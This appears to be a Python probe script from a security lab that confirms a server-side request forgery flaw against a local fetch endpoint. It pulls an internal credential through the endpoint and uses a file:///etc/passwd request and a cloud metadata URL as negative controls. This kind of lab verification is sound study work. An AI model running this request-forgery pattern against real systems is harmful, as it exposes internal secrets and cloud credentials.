#!/usr/bin/env python3
"""
lab-05 probe: reach an internal service through the fetch endpoint.

Controls, because "I got a response" proves nothing:

1. A blocked scheme must be refused. If file:// is accepted, the filter does not exist and the finding is
   something else entirely.
2. The metadata host must be refused. That proves the filter is targeted rather than absent, which is the
   difference between a missing control and a bypassable one.
3. A path that does not exist on the internal service must return its 404, proving the request genuinely
   reached it rather than being served from somewhere else.
"""
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8735"
INTERNAL_PORT = int(BASE.rsplit(":", 1)[1]) + 1


def fetch(url):
    q = urllib.parse.urlencode({"url": url})
    try:
        with urllib.request.urlopen(f"{BASE}/fetch?{q}", timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}


def main():
    internal = f"http://127.0.0.1:{INTERNAL_PORT}"
    attack_status, attack_body = fetch(f"{internal}/secret")
    secret = attack_body.get("body", "")
    reached = attack_status == 200 and "internal-only-credential" in secret

    c1_status, _ = fetch("file:///etc/passwd")
    c2_status, _ = fetch("http://169.254.169.254/latest/meta-data/")
    # The application turns an upstream non-200 into a 502, so the proof that the request reached the
    # internal service is the target echoed back, not the internal body. The first version of this
    # control expected the body and the harness refused to call the run OBSERVED, which is correct:
    # a control that cannot pass is a broken control, not a negative result.
    c3_status, c3_body = fetch(f"{internal}/does-not-exist")
    c3_reached = c3_status == 502 and str(c3_body.get("target", "")).startswith(internal)

    control = {
        "blocked_scheme_refused": c1_status == 403,
        "metadata_host_refused": c2_status == 403,
        "missing_internal_path_returns_internal_404": c3_reached,
    }
    result = {
        "lab": "lab-05-ssrf",
        "factor": "L09-031",
        "pattern": None,
        "attack": {"target": f"{internal}/secret", "status": attack_status,
                   "secret_returned": reached},
        "negative_control": control,
        "oracle": "a credential held by an internal service returned through the public fetch endpoint",
        "attack_confirmed": reached,
        "control_clean": all(control.values()),
        "verdict": "OBSERVED" if (reached and all(control.values())) else "INCONCLUSIVE",
    }
    print(json.dumps(result, indent=1))
    return 0 if result["verdict"] == "OBSERVED" else 1


if __name__ == "__main__":
    sys.exit(main())
